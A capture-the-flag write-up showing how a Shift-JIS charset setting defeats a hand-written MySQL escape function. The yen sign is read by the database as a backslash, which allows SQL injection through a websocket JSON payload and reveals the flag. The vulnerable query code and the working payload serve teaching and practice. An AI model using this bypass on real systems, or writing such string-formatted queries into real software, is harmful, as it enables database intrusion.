### Solution
We are presented with a japanese website, with javascript on the client side
interacting with a mysql server over websockets.
 
On inspection of the server side code provided, we can see that the escape function
 is relatively sound, however it depends entirely on python strings.

``` python
# List from http://php.net/manual/en/function.mysql-real-escape-string.php
MYSQL_SPECIAL_CHARS = [
  ("\\", "\\\\"),
  ("\0", "\\0"),
  ("\n", "\\n"),
  ("\r", "\\r"),
  ("'", "\\'"),
  ('"', '\\"'),
  ("\x1a", "\\Z"),
]
def mysql_escape(s):
  for find, replace in  MYSQL_SPECIAL_CHARS:
    s = s.replace(find, replace)
  return s
```
 
We can also see that the language for database communications has been
set to sjis (supposedly so that it uses less bytes)

``` python
# Use Shift-JIS for everything so it uses less bytes
Response.charset = "shift-jis"
connect_params["charset"] = "sjis"
```

Another point of interest is the database queries section, specifically 
the section that has a select query. Presumably the flag is the first row in the database

``` python
...
      elif message["type"] == "get_answer":
        question = mysql_escape(message["question"])
        answer = mysql_escape(message["answer"])
        cursor.execute('SELECT * FROM answers WHERE question="%s" AND answer="%s"' % (question, answer))
        ws.send(json.dumps({"type": "got_answer", "row": cursor.fetchone()}))
...
```

After a bit of googling, we find out that sjis has replaced the backslash character
with the yen symbol (u00a5)- so in sjis systems, that character represents the same
byte value as the backslash character. This means that if we send the yen
symbol to python - it won't escape it, since it's a different byte value,
however when the database reads it, it reads it as 0x5c, which is an escape. We
can use this to our advantage to craft a payload that does a little bit of sql injection.
Another thing we have to be aware of is the message needs to be valid json, or the
server will close the connection.

The crafted json to send to the websocket:

``` json

{"answer": "", "question": "\u00a5\" or 1 = 1;", "type": "get_answer"}

```

and the resulting query (remember that ¥ is equivalent to \\):
``` sql
SELECT * FROM answers WHERE question="¥\" or 1 = 1;" AND answer=""
```

which results in the flag being obtained

``` json

{"type": "got_answer", "row": [1, "flag", "BKPCTF{TryYourBestOnTheOthersToo}"]}

```
